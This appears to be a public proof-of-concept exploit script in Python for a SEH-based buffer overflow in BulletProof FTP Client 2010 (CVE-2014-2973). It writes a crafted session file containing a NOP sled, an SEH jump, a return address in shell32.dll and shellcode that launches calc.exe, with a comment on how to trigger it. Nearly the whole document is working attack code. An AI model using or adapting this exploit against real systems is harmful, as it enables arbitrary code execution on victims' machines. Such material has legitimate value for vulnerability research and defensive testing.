# !/usr/bin/python
#-----------------------------------------------------------------------------#
# Exploit Title: BulletProof FTP Client 2010 - Buffer Overflow (SEH) Exploit  #
# Date: Sep 05 2014                                                           #
# Vulnerability Discovery: Gabor Seljan                                       #
# Exploit Author: Robert Kugler                                               #
# Software Link: http://www.bpftp.com/                                        #
# Version: 2010.75.0.76                                                       #
# Tested on: Windows XP                                                       #
# CVE: CVE-2014-2973                                                          #
#                                                                             #
# Thanks to corelanc0d3r for his awesome tutorials and help! ;-)              #
# The "Enter URL" form is also vulnerable                                     #
#-----------------------------------------------------------------------------#
 
buffer = "This is a BulletProof FTP Client Session-File and should not be modified directly.\n"
buffer+= "\x20" + "\x90" * 89
buffer+= "\xeb\x06\x90\x90"
buffer+= "\xA0\xB3\x3C\x77" # shell32.dll pop pop ret @773CB3A0
buffer+= "\x90" * 119 # 160 characters space
buffer+= ("\x33\xc0\x50\x68"
         "\x2E\x65\x78\x65"
         "\x68\x63\x61\x6C"
         "\x63\x8B\xC4\x6A" # 36 bytes
         "\x01\x50\xBB\x35" # ExitProcess is located at 0x77e598fd in kernel32.dll
         "\xfd\xe4\x77\xFF"
         "\xD3\x33\xc0\x50"
     "\xc7\xc0\x8f\x4a"
     "\xe5\x77\xff\xe0")
 
buffer+= "\x90" * (1000 - len(buffer))
 
# Just load the "BP Session" and click on "Connect".
 
file = open("ftpsession.bps","w")
file.write(buffer)
file.close()
